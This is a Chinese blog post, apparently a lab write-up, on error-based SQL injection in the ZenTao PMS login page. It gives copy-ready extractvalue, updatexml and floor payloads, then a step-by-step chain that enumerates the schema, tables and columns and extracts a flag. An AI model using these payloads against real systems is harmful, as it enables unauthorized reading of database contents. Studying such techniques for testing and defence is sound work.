---
title: "禅道 PMS 用户登录存在 SQL 注入"
date: 2024-02-19
description: "登录页面用户名处输入恶意语句，抓包可以看到利用语法报错外带的数据库信息"
tags: ["SQL 注入","后端漏洞"]
featured_image: ""
# images is optional, but needed for showing Twitter Card
images: []
categories: "sec"
comment: false
draft: false
---

## 语法报错

下述 payload 可以直接复制使用。

### extractvalue()

    1' and extractvalue(1,concat(0x5c,0x7e,(select schema_name from information_schema.schemata limit 0,1),0x7e)) and '1'='1

### updatexml()

    1' and updatexml(1,concat(0x5c,0x7e,(select schema_name from information_schema.schemata limit 0,1),0x7e),1) and '1'='1

### floor()

    1' and (select 1 from (select count(*),concat((select schema_name from information_schema.schemata limit 0,1),0x2b,floor(rand(0)*2))x from information_schema.tables group by x)a) and '1'='1

## 攻击流程

打开靶场看到如下页面。在输入随机用户名密码之后会出现弹窗，告诉我们密码有误。但是输入单引号之后，页面没有任何变化。没有出现弹窗说明单引号起作用了，这提示我们存在 sql 注入点。我们用 burp 抓包发现虽然浏览器里面的页面没有显示报错，但是 burp 里面可以看到语法报错。后面走走流程就可以拿到 flag。

![sqli6](/images/sqli1/sqli6-3.png)

构造如下 payload。

    1' and extractvalue(1,concat(0x5c,0x7e,(select schema_name from information_schema.schemata limit 0,1),0x7e)) and '1'='1

    1' and extractvalue(1,concat(0x5c,0x7e,(select table_name from information_schema.tables where table_schema='zentao' limit 0,1),0x7e)) and '1'='1

    1' and extractvalue(1,concat(0x5c,0x7e,(select column_name from information_schema.columns where table_schema='zentao' and table_name='flag' limit 0,1),0x7e)) and '1'='1

    1' and extractvalue(1,concat(0x5c,0x7e,(select flag from zentao.flag),0x7e)) and '1'='1

最终拿到 flag=ywaq{sql-ywaqnb-bczr}。上述 payload 效果如下。

![sqli6](/images/sqli1/sqli6-0.png)

![sqli6](/images/sqli1/sqli6-1.png)

![sqli6](/images/sqli1/sqli6-2.png)